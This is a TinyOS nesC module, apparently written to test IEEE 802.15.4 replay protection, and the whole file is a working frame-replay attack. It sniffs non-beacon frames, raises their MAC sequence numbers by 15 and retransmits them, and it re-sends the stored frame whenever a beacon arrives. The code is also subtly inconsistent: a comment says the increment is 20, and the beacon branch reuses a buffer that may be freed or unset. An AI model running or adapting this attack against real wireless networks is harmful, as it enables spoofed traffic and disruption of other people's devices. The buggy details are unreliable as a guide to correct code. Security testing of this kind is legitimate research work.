
#include "TKN154.h"
#include "printf.h"

module ReplayProtectionAttackC{
	uses interface Boot;
	uses interface RadioRx;
	uses interface RadioOff;
	uses interface RadioTx;
	uses interface IEEE154Frame;
	uses interface MLME_RESET;
	uses interface Timer<T62500hz> as ResendTimer;
} implementation {

	enum {
		RESEND_INTERVAL = 300,
		SEND_INTERVAL = 20,
	};

	message_t *m_msg = NULL;
	ieee154_txframe_t *send_msg;

	event void MLME_RESET.confirm(ieee154_status_t status){}

	event void Boot.booted(){
		printf("Booted\n");
		// Let the device listen the radio
		call RadioRx.enableRx(0, 0);
	}

	async event void RadioOff.offDone(){
		// get the sender address and the sequence number and send a frame with
		// sequence number increased by 20
		send_msg = malloc(sizeof(ieee154_txframe_t));
		send_msg->header = m_msg -> header;
		send_msg->payload = m_msg -> data;
		send_msg->headerLen = call IEEE154Frame.getHeaderLength(m_msg);
		send_msg->payloadLen = call IEEE154Frame.getPayloadLength(m_msg);
		send_msg->metadata = m_msg -> metadata;

		call RadioTx.transmit(send_msg, 0, 0);
	}

	event void ResendTimer.fired(){
		printf("Timer fired\n");
		call RadioTx.transmit(send_msg, 0, 0);
	}

	async event void RadioTx.transmitDone(ieee154_txframe_t *msg, error_t result){
		printf("Attacked\n");
		if(result == SUCCESS){
			free(send_msg);
			// call ResendTimer.startOneShot(RESEND_INTERVAL);
			call RadioRx.enableRx(0,0);
		}
		else
			call RadioTx.transmit(send_msg, 0, 0);
	}

	event message_t* RadioRx.received(message_t *msg){
		printf("Received\n");
		if( call IEEE154Frame.getFrameType(msg) != FRAMETYPE_BEACON ){
			printf("Not a beacon\n");
			MHR(msg)[MHR_INDEX_SEQNO] = MHR(msg)[MHR_INDEX_SEQNO] + 15;
			m_msg = msg;
			call RadioOff.off();
			// call ResendTimer.stop();
		} else {
			MHR(send_msg)[MHR_INDEX_SEQNO] = (uint8_t) MHR(send_msg)[MHR_INDEX_SEQNO] + 15;
			call RadioTx.transmit(send_msg, 0, 0);
		}
		return msg;
	}

	async event void RadioRx.enableRxDone(){
		printf("Receiving\n");
	}

}